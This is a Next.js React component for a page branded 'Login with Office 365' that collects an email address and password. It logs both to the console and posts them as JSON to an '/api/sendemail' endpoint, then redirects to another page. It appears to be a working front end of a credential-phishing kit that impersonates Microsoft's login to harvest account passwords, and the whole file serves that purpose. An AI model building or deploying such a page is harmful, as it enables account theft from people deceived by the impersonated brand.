import Link from 'next/link'
import Image from 'next/image'
import { useState } from 'react'
import { useRouter } from 'next/router'

const Office = () => {
    const Router = useRouter()

    const [email, setEmail] = useState()
    const [password, setPassword] = useState()

    const handleSubmit = (e) => {
      e.preventDefault();
      let data = {
          email,
          password
      }
      const jsondata = JSON.stringify(data)
      console.log(jsondata)

      fetch('/api/sendemail', {
          method: 'POST',
          body: jsondata
      }).then((res) => {
          console.log('successful')
          if (res.status === 200) {
              Router.push('signup/office.js')
            //   setEmail('')
            //   setPassword('')
          }
      })
    }

    return (
        <>
        <div className="h-screen w-full bg-[#FAFAFA] flex justify-center items-start">
          <div className="mt-12">
              <div className="w-[550px] h-88 bg-white border-[1px] border-solid border-[#F1F1F1] flex flex-col items-center p-20">
                       <Image
                          src="/images/office365.png"
                          className="mt-20"
                          height={110}
                          width={90}
                          alt="second hero"/>
                           <h2 className="modal-title p-5" id="exampleModalLabel">Login with <span id="field">Office 365</span></h2>

                          <form onSubmit={(e) => handleSubmit(e)} className='mt-6 flex flex-col'>
                          <label >Email address</label>
                          <input type="text" placeholder="Enter Email" id='email' name='email'onChange={(e) =>{ return setEmail(e.target.value)}} 
                            className='w-[390px] h-[45px] border-[1px] border-solid border-[#F1F1F1] bg-[#FAFAFA] mb-3 p-2 placeholder:text-sm focus:outline-none'
                             required/>

                        <label>Password</label>
                          <input type="password" placeholder="Enter Password" id='password' name='password' onChange={(e) =>{return setPassword(e.target.value)}}
                            className='w-[390px] h-[45px] border-[0.5px] border-solid border-[#F1F1F1] bg-[#FAFAFA] mb-3 p-2 placeholder:text-sm focus:outline-none' 
                            required/>

                        <button type="submit" className='text-white font-semibold w-[150px] h-[55px] border-[0.5px] border-solid border-[#F1F1F1] bg-[#fc4e19]'>Log In</button>
                          </form> 

                         
              </div>
          
          </div>
        </div>
        </>
    )
}

export default Office